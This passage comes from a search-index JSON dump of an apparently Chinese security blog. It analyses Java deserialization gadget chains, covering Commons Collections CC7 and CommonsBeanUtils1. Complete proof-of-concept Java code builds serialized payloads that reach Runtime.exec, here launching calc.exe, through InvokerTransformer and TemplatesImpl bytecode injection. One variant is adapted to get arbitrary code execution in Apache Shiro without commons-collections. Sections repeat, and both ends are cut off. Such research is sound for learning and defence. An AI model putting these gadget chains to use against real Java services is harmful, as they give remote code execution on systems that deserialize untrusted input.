}","title":"\u6700\u7ec8poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u8c03\u7528\u903b\u8f91_4","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: BadAttributeValueExpException.readObject() valObj.toString() === TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#cc7","text":"","title":"CC7"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u5165\u53e3_2","text":"CC7\u7a0d\u5fae\u6709\u70b9\u590d\u6742\uff0c\u5229\u7528\u7684\u662f Hashtable.equals \u65b9\u6cd5\u53bb\u89e6\u53d1 LazyMap.get \u3002 \u8be6\u60c5\u5206\u6790 \u901a\u4fd7\u6613\u61c2\u7684Java Commons Collections 5\u30016\u30017\u5206\u6790 - \u5148\u77e5\u793e\u533a","title":"\u5165\u53e3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u6700\u7ec8poc_1","text":"package top.longlone ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Hashtable ; import java.util.Map ; public class CC7 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 0 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap1 = new HashMap (); Map innerMap2 = new HashMap (); Map lazyMap1 = LazyMap . decorate ( innerMap1 , transformerChain ); lazyMap1 . put ( \"yy\" , 2 ); Map lazyMap2 = LazyMap . decorate ( innerMap2 , transformerChain ); lazyMap2 . put ( \"zZ\" , 2 ); Hashtable hashtable = new Hashtable (); hashtable . put ( lazyMap1 , 1 ); hashtable . put ( lazyMap2 , 1 ); lazyMap2 . remove ( \"yy\" ); Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( hashtable ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); ois . readObject (); } }","title":"\u6700\u7ec8poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/#\u8c03\u7528\u903b\u8f91_5","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: Hashtable.readObject() Hashtable.reconstitutionPut() org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u4e4bCommonsBeanUtils1 # CommonsBeanUtils1\u7684\u540e\u534a\u6bb5\u8fd8\u662f\u6211\u4eec\u719f\u6089\u7684\u8001\u670b\u53cb TemplatesImpl \uff0c\u53ea\u8981\u89e6\u53d1\u5230\u5176 newTransformer \u65b9\u6cd5\uff0c\u540e\u9762\u7684\u94fe\u5c31\u548cCC2\u4e4b\u7c7b\u7684\u4e00\u6837\u4e86\uff0c\u800cCB1\u89e6\u53d1 newTransformer \u7684\u65b9\u6cd5\u662f getOutputProperties \uff0c\u6240\u4ee5CommonsBeanUtils\u7684\u524d\u534a\u6bb5\u4e3b\u8981\u662f\u56f4\u7ed5\u5982\u4f55\u901a\u8fc7readObject\u89e6\u53d1getter\u65b9\u6cd5\u5c55\u5f00 \u53c2\u8003\u6587\u7ae0: CommonsBeanutils\u4e0e\u65e0commons-collections\u7684Shiro\u53cd\u5e8f\u5217\u5316\u5229\u7528 \u4e86\u89e3Apache Commons Beanutils # Apache Commons Beanutils \u662f Apache Commons \u5de5\u5177\u96c6\u4e0b\u7684\u53e6\u4e00\u4e2a\u9879\u76ee\uff0c\u5b83\u63d0\u4f9b\u4e86\u5bf9\u666e\u901aJava\u7c7b\u5bf9\u8c61\uff08\u4e5f\u79f0\u4e3aJavaBean\uff09\u7684\u4e00\u4e9b\u64cd\u4f5c\u65b9\u6cd5\u3002 JavaBean\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u4e2a\u7c7b\u7684\u5199\u6cd5\u89c4\u8303\uff0c\u5176\u4e00\u4e2a\u7279\u5f81\u662f\u7c7b\u4e2d\u6240\u6709\u5c5e\u6027\u90fd\u662f\u79c1\u6709\u7684\uff0c\u901a\u8fc7setter\u548cgetter\u65b9\u6cd5\u6765\u8bbe\u7f6e\u548c\u83b7\u53d6\u5c5e\u6027 \u6bd4\u5982\u4ee5\u4e0b\u4e00\u4e2a Cat \u7c7b: final public class Cat { private String name = \"catalina\" ; public String getName () { return name ; } public void setName ( String name ) { this . name = name ; } } \u5b83\u5305\u542b\u4e00\u4e2a\u79c1\u6709\u5c5e\u6027name\uff0c\u548c\u8bfb\u53d6\u548c\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u7684\u4e24\u4e2a\u65b9\u6cd5\uff0c\u53c8\u79f0\u4e3agetter\u548csetter\u3002\u5176\u4e2d\uff0cgetter\u7684\u65b9\u6cd5\u540d\u4ee5get\u5f00\u5934\uff0csetter\u7684\u65b9\u6cd5\u540d\u4ee5set\u5f00\u5934\uff0c\u5168\u540d\u7b26\u5408\u9a86\u9a7c\u5f0f\u547d\u540d\u6cd5\uff08Camel-Case\uff09\u3002 commons-beanutils\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5PropertyUtils.getProperty\uff0c\u8ba9\u4f7f\u7528\u8005\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u4efb\u610fJavaBean\u7684getter\u65b9\u6cd5\uff0c\u6bd4\u5982\uff1a PropertyUtils.getProperty(new Cat(), \"name\"); \u4e3b\u89d2\u767b\u573a: BeanComparator # \u8fd9\u4e2a\u662f CommonsBeanUtils \u4e2d\u7684\u4e00\u4e2a\u6bd4\u8f83\u7c7b\uff0c\u5176 compare \u65b9\u6cd5\u5f88\u6709\u610f\u601d\uff0c\u4f1a\u8c03\u7528 PropertyUtils.getProperty \u65b9\u6cd5: public int compare ( final T o1 , final T o2 ) { if ( property == null ) { // compare the actual objects return internalCompare ( o1 , o2 ); } try { final Object value1 = PropertyUtils . getProperty ( o1 , property ); final Object value2 = PropertyUtils . getProperty ( o2 , property ); return internalCompare ( value1 , value2 ); } catch ( final IllegalAccessException iae ) { throw new RuntimeException ( \"IllegalAccessException: \" + iae . toString () ); } catch ( final InvocationTargetException ite ) { throw new RuntimeException ( \"InvocationTargetException: \" + ite . toString () ); } catch ( final NoSuchMethodException nsme ) { throw new RuntimeException ( \"NoSuchMethodException: \" + nsme . toString () ); } } \u6839\u636e\u4e4b\u524d\u7684\u5b66\u4e60\u6211\u4eec\u77e5\u9053CC2\u94fe\u4e2d\u5165\u53e3\u662f\u4ee5PriorityQueue\uff0c\u4e3b\u8981\u7684\u627f\u63a5\u65b9\u6cd5\u5c31\u662f\u67d0\u4e2aComparer\u7684 compare \u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a BeanComparer \u6784\u9020\u51fa\u65b0\u7684\u94fe: package top.longlone ; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import org.apache.commons.beanutils.BeanComparator ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.PriorityQueue ; public class CB1 { public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } public static TemplatesImpl generateTemplates ( String code ) throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( code ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); return newTemplatesWithClassBytes ( classBytes ); } private static TemplatesImpl newTemplatesWithClassBytes ( byte [] classBytes ) throws Exception { TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , new byte [][] { classBytes }); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static byte [] getPayload () throws Exception { TemplatesImpl obj = generateTemplates ( \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ); final BeanComparator comparator = new BeanComparator (); final PriorityQueue < Object > queue = new PriorityQueue < Object > ( 2 , comparator ); // stub data for replacement later queue . add ( \"1\" ); queue . add ( \"1\" ); setFieldValue ( comparator , \"property\" , \"outputProperties\" ); setFieldValue ( queue , \"queue\" , new Object [] { obj , obj }); // ================== // \u751f\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32 ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); return barr . toByteArray (); } public static void main ( String [] args ) throws Exception { byte [] payload = getPayload (); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( payload )); ois . readObject (); } } \u5728shiro\u4e0b\u5229\u7528\u7684\u5751\u70b9 # Shiro\u4e2d\u81ea\u5e26\u7684commons-beanutils\u4e0e\u6211\u4eec\u672c\u5730\u7684\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u5c31\u53ef\u80fd\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u51fa\u73b0serialVersionUID\u5bf9\u5e94\u4e0d\u4e0a\u7684\u95ee\u9898 commons-beanutils\u672c\u6765\u4f9d\u8d56\u4e8ecommons-collections\uff0c\u4f46\u662f\u5728Shiro\u4e2d\uff0c\u5b83\u7684commons-beanutils\u867d\u7136\u5305\u542b\u4e86\u4e00\u90e8\u5206commons-collections\u7684\u7c7b\uff0c\u4f46\u5374\u4e0d\u5168\u3002\u8fd9\u4e5f\u5bfc\u81f4\uff0c\u6b63\u5e38\u4f7f\u7528Shiro\u7684\u65f6\u5019\u4e0d\u9700\u8981\u4f9d\u8d56\u4e8ecommons-collections\uff0c\u4f46\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7684\u65f6\u5019\u9700\u8981\u4f9d\u8d56\u4e8ecommons-collections\u3002 \u89e3\u51b3\u7b2c\u4e00\u4e2a\u5751\u70b9 # \u89e3\u51b3\u7b2c\u4e00\u4e2a\u5751\u70b9\u5f88\u7b80\u5355\uff0c\u5c06\u4f9d\u8d56\u7248\u672c\u66ff\u6362\u5c31\u53ef\u4ee5\uff0c\u8fd8\u6709\u4e00\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49ClassLoader\u6765\u505a\u9694\u79bb \u89e3\u51b3\u7b2c\u4e8c\u4e2a\u5751\u70b9 # \u6211\u4eec\u6765\u770b\u770b\u6211\u4eec\u8fd9\u6761\u94fe\u7a76\u7adf\u662f\u54ea\u91cc\u7528\u5230\u4e86commons-collections\u7684\u4f9d\u8d56: \u5f53\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bcomparator\u65f6\uff0c\u4ed6\u4f1a\u4f7f\u7528commons-collections\u7684Comparator\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u4e00\u4e2a\u65b0\u7684Comparator\uff0c\u5b83\u8981\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6: - \u5b9e\u73b0 java.util.Comparator \u63a5\u53e3 - \u5b9e\u73b0 java.io.Serializable \u63a5\u53e3 - Java\u3001shiro\u6216commons-beanutils\u81ea\u5e26\uff0c\u4e14\u517c\u5bb9\u6027\u5f3a \u7ed3\u5408\u53c2\u8003\u6587\u7ae0\uff0c\u6211\u4eec\u627e\u5230\u4e86CaseInsensitiveComparator\u8fd9\u4e2a\u7c7b\uff0c\u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u5f88\u7b80\u5355\u5730\u901a\u8fc7 String.CASE_INSENSITIVE_ORDER \u62ff\u5230\u4e0a\u4e0b\u6587\u4e2d\u7684 CaseInsensitiveComparator \u5bf9\u8c61: \u5c06\u94fe\u7a0d\u4f5c\u4fee\u6539\uff0c\u4fee\u6539BeanComparator\u7684\u5b9e\u4f8b\u5316\u53c2\u6570\uff0c\u5373\u53ef\u6210\u529f\u5728shiro\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801: package top.longlone ; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import org.apache.commons.beanutils.BeanComparator ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.PriorityQueue ; public class CB1 { public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } public static TemplatesImpl generateTemplates ( String code ) throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( code ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); return newTemplatesWithClassBytes ( classBytes ); } private static TemplatesImpl newTemplatesWithClassBytes ( byte [] classBytes ) throws Exception { TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , new byte [][] { classBytes }); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static byte [] getPayload () throws Exception { TemplatesImpl obj = generateTemplates ( \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ); final BeanComparator comparator = new BeanComparator ( null , String . CASE_INSENSITIVE_ORDER ); final PriorityQueue < Object > queue = new PriorityQueue < Object > ( 2 , comparator ); // stub data for replacement later queue . add ( \"1\" ); queue . add ( \"1\" ); setFieldValue ( comparator , \"property\" , \"outputProperties\" ); setFieldValue ( queue , \"queue\" , new Object [] { obj , obj }); // ================== // \u751f\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32 ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); return barr . toByteArray (); } public static void main ( String [] args ) throws Exception { byte [] payload = getPayload (); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( payload )); ois . readObject (); } } \u8c03\u7528\u903b\u8f91 # PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === BeanComparator.compare() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"\u53cd\u5e8f\u5217\u5316\u4e4bCommonsBeanUtils1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u53cd\u5e8f\u5217\u5316\u4e4bcommonsbeanutils1","text":"CommonsBeanUtils1\u7684\u540e\u534a\u6bb5\u8fd8\u662f\u6211\u4eec\u719f\u6089\u7684\u8001\u670b\u53cb TemplatesImpl \uff0c\u53ea\u8981\u89e6\u53d1\u5230\u5176 newTransformer \u65b9\u6cd5\uff0c\u540e\u9762\u7684\u94fe\u5c31\u548cCC2\u4e4b\u7c7b\u7684\u4e00\u6837\u4e86\uff0c\u800cCB1\u89e6\u53d1 newTransformer \u7684\u65b9\u6cd5\u662f getOutputProperties \uff0c\u6240\u4ee5CommonsBeanUtils\u7684\u524d\u534a\u6bb5\u4e3b\u8981\u662f\u56f4\u7ed5\u5982\u4f55\u901a\u8fc7readObject\u89e6\u53d1getter\u65b9\u6cd5\u5c55\u5f00 \u53c2\u8003\u6587\u7ae0: CommonsBeanutils\u4e0e\u65e0commons-collections\u7684Shiro\u53cd\u5e8f\u5217\u5316\u5229\u7528","title":"\u53cd\u5e8f\u5217\u5316\u4e4bCommonsBeanUtils1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u4e86\u89e3apache-commons-beanutils","text":"Apache Commons Beanutils \u662f Apache Commons \u5de5\u5177\u96c6\u4e0b\u7684\u53e6\u4e00\u4e2a\u9879\u76ee\uff0c\u5b83\u63d0\u4f9b\u4e86\u5bf9\u666e\u901aJava\u7c7b\u5bf9\u8c61\uff08\u4e5f\u79f0\u4e3aJavaBean\uff09\u7684\u4e00\u4e9b\u64cd\u4f5c\u65b9\u6cd5\u3002 JavaBean\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u4e2a\u7c7b\u7684\u5199\u6cd5\u89c4\u8303\uff0c\u5176\u4e00\u4e2a\u7279\u5f81\u662f\u7c7b\u4e2d\u6240\u6709\u5c5e\u6027\u90fd\u662f\u79c1\u6709\u7684\uff0c\u901a\u8fc7setter\u548cgetter\u65b9\u6cd5\u6765\u8bbe\u7f6e\u548c\u83b7\u53d6\u5c5e\u6027 \u6bd4\u5982\u4ee5\u4e0b\u4e00\u4e2a Cat \u7c7b: final public class Cat { private String name = \"catalina\" ; public String getName () { return name ; } public void setName ( String name ) { this . name = name ; } } \u5b83\u5305\u542b\u4e00\u4e2a\u79c1\u6709\u5c5e\u6027name\uff0c\u548c\u8bfb\u53d6\u548c\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u7684\u4e24\u4e2a\u65b9\u6cd5\uff0c\u53c8\u79f0\u4e3agetter\u548csetter\u3002\u5176\u4e2d\uff0cgetter\u7684\u65b9\u6cd5\u540d\u4ee5get\u5f00\u5934\uff0csetter\u7684\u65b9\u6cd5\u540d\u4ee5set\u5f00\u5934\uff0c\u5168\u540d\u7b26\u5408\u9a86\u9a7c\u5f0f\u547d\u540d\u6cd5\uff08Camel-Case\uff09\u3002 commons-beanutils\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5PropertyUtils.getProperty\uff0c\u8ba9\u4f7f\u7528\u8005\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u4efb\u610fJavaBean\u7684getter\u65b9\u6cd5\uff0c\u6bd4\u5982\uff1a PropertyUtils.getProperty(new Cat(), \"name\");","title":"\u4e86\u89e3Apache Commons Beanutils"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u4e3b\u89d2\u767b\u573a-beancomparator","text":"\u8fd9\u4e2a\u662f CommonsBeanUtils \u4e2d\u7684\u4e00\u4e2a\u6bd4\u8f83\u7c7b\uff0c\u5176 compare \u65b9\u6cd5\u5f88\u6709\u610f\u601d\uff0c\u4f1a\u8c03\u7528 PropertyUtils.getProperty \u65b9\u6cd5: public int compare ( final T o1 , final T o2 ) { if ( property == null ) { // compare the actual objects return internalCompare ( o1 , o2 ); } try { final Object value1 = PropertyUtils . getProperty ( o1 , property ); final Object value2 = PropertyUtils . getProperty ( o2 , property ); return internalCompare ( value1 , value2 ); } catch ( final IllegalAccessException iae ) { throw new RuntimeException ( \"IllegalAccessException: \" + iae . toString () ); } catch ( final InvocationTargetException ite ) { throw new RuntimeException ( \"InvocationTargetException: \" + ite . toString () ); } catch ( final NoSuchMethodException nsme ) { throw new RuntimeException ( \"NoSuchMethodException: \" + nsme . toString () ); } } \u6839\u636e\u4e4b\u524d\u7684\u5b66\u4e60\u6211\u4eec\u77e5\u9053CC2\u94fe\u4e2d\u5165\u53e3\u662f\u4ee5PriorityQueue\uff0c\u4e3b\u8981\u7684\u627f\u63a5\u65b9\u6cd5\u5c31\u662f\u67d0\u4e2aComparer\u7684 compare \u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a BeanComparer \u6784\u9020\u51fa\u65b0\u7684\u94fe: package top.longlone ; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import org.apache.commons.beanutils.BeanComparator ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.PriorityQueue ; public class CB1 { public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } public static TemplatesImpl generateTemplates ( String code ) throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( code ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); return newTemplatesWithClassBytes ( classBytes ); } private static TemplatesImpl newTemplatesWithClassBytes ( byte [] classBytes ) throws Exception { TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , new byte [][] { classBytes }); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static byte [] getPayload () throws Exception { TemplatesImpl obj = generateTemplates ( \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ); final BeanComparator comparator = new BeanComparator (); final PriorityQueue < Object > queue = new PriorityQueue < Object > ( 2 , comparator ); // stub data for replacement later queue . add ( \"1\" ); queue . add ( \"1\" ); setFieldValue ( comparator , \"property\" , \"outputProperties\" ); setFieldValue ( queue , \"queue\" , new Object [] { obj , obj }); // ================== // \u751f\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32 ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); return barr . toByteArray (); } public static void main ( String [] args ) throws Exception { byte [] payload = getPayload (); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( payload )); ois . readObject (); } }","title":"\u4e3b\u89d2\u767b\u573a: BeanComparator"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u5728shiro\u4e0b\u5229\u7528\u7684\u5751\u70b9","text":"Shiro\u4e2d\u81ea\u5e26\u7684commons-beanutils\u4e0e\u6211\u4eec\u672c\u5730\u7684\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u5c31\u53ef\u80fd\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u51fa\u73b0serialVersionUID\u5bf9\u5e94\u4e0d\u4e0a\u7684\u95ee\u9898 commons-beanutils\u672c\u6765\u4f9d\u8d56\u4e8ecommons-collections\uff0c\u4f46\u662f\u5728Shiro\u4e2d\uff0c\u5b83\u7684commons-beanutils\u867d\u7136\u5305\u542b\u4e86\u4e00\u90e8\u5206commons-collections\u7684\u7c7b\uff0c\u4f46\u5374\u4e0d\u5168\u3002\u8fd9\u4e5f\u5bfc\u81f4\uff0c\u6b63\u5e38\u4f7f\u7528Shiro\u7684\u65f6\u5019\u4e0d\u9700\u8981\u4f9d\u8d56\u4e8ecommons-collections\uff0c\u4f46\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7684\u65f6\u5019\u9700\u8981\u4f9d\u8d56\u4e8ecommons-collections\u3002","title":"\u5728shiro\u4e0b\u5229\u7528\u7684\u5751\u70b9"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u89e3\u51b3\u7b2c\u4e00\u4e2a\u5751\u70b9","text":"\u89e3\u51b3\u7b2c\u4e00\u4e2a\u5751\u70b9\u5f88\u7b80\u5355\uff0c\u5c06\u4f9d\u8d56\u7248\u672c\u66ff\u6362\u5c31\u53ef\u4ee5\uff0c\u8fd8\u6709\u4e00\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49ClassLoader\u6765\u505a\u9694\u79bb","title":"\u89e3\u51b3\u7b2c\u4e00\u4e2a\u5751\u70b9"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%